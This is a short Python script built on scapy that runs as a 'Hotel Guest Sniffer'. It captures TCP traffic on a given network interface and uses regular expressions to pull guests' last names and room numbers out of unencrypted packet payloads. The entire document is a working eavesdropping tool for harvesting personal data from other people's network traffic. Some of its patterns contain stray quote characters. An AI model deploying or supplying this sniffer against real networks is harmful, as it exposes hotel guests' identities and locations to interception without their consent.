from scapy.all import *
import optparse
import re

def findGuest(pkt):
    raw = pkt.sprintf("%Raw.load%")
    name = re.findall("(?i)LAST_NAME=(.*)&'",raw)
    room = re.findall("(?i)ROOM_NUMBER=(.*)'", raw)
    if name:
        print("[+] Found Hotel Guest" + str(name[0] + ", Room #" + str(room[0])))

def getOptions():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", type="string", help="The name of the interface for sniffing.")
    (options, args) = parser.parse_args()
    if options.interface == None:
        parser.error("Please specify an interface using the -i or --interface parameter.\nUse --help for more informations.")
        exit(0)
    else:
        return options.interface

try:
    conf.iface = getOptions()
    print("[*] Starting Hotel Guest Sniffer.")
    sniff(filter="tcp", prn=findGuest, store=0)
except KeyboardInterrupt:
    exit(0)
